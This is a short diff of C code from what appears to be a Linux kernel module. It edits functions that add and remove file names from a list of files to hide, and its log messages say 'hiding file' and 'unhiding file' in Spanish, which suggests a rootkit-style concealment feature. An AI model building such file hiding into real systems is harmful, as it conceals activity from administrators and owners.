@@ -514,7 +514,9 @@ LIST_HEAD(file_list);
 
 int file_add(const char *name)
 {
+    //Modified Section
     pr_info("Ocultando Archivo \n");
+    //Modified Section
     struct file_entry *f = kmalloc(sizeof(struct file_entry), GFP_KERNEL);
 
     if (!f) {
@@ -528,13 +530,13 @@ int file_add(const char *name)
         kfree(f);
         return 0;
     }
-
+    //Modified Section
     f->name = kmalloc(name_len, GFP_KERNEL);
     if (!f->name) {
         kfree(f);
         return 0;
     }
-
+    //Modified Section
     strncpy(f->name, name, name_len);
 
     list_add(&f->list, &file_list);
@@ -544,13 +546,17 @@ int file_add(const char *name)
 
 void file_remove(const char *name)
 {
+    //Modified Section
     pr_info("Desocultando Archivo \n");
+    //Modified Section
     struct file_entry *f, *tmp;
 
     list_for_each_entry_safe(f, tmp, &file_list, list) {
         if (strcmp(f->name, name) == 0) {
+            //Modified Section
             list_del(&f->list);
             kfree(f->name);
+            //Modified Section
             kfree(f);
             break;
         }
